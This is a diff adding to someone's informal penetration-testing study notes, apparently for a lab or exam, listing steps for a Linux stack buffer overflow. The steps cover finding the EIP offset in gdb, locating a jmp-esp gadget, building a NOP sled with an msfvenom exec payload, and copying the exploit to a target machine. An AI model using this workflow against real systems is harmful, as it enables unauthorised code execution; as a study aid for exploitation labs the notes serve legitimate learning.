@@ -42,4 +42,46 @@ widnows!!!!
 port 3389,9999
 if 9999 is open, netcat for secure server 
 buffer overflow::::
+--linux--
+virfy the program is buffer over flowable 
+    enter a loooooong string 
+    gbd func (func = program name)
+    pdisass main
+    pdisass getuserinput >> look for RED text 
 
+create python script for function 
+    gdb
+    run <<< $(python2 buffover.py)
+    copy EIP hex from output
+    paste EIP into https://wiremask.eu/tools/buffer-overflow-pattern-generator/ to find offset
+    
+    env - gbd 
+    file func (func = program name)
+    unset env LINES
+    unset env COLUMNS
+    show env 
+    run 
+    *overflow program with strings* looking for the EIP seg fault
+    info proc map 
+    *look for first one after [heap]*
+    *look for value right above [stack]*
+    find /b [head], [stack], 0xff, 0xe4
+    copy and paste random segment from output into script + nop sled 
+    create payload msfvenom "msfvenom -p linux/x86/exec CMD="whoami" -b "\x00" -f python"
+    when youre ready to test it, run the program (not in gdb) 
+    ./func <<< $(python2 buffover2.py) 
+    should return output of command in payload
+success!!
+    copy and paste/ scp to target machine
+    get the targets EIP through info proc mapand paste it into the script to run 
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
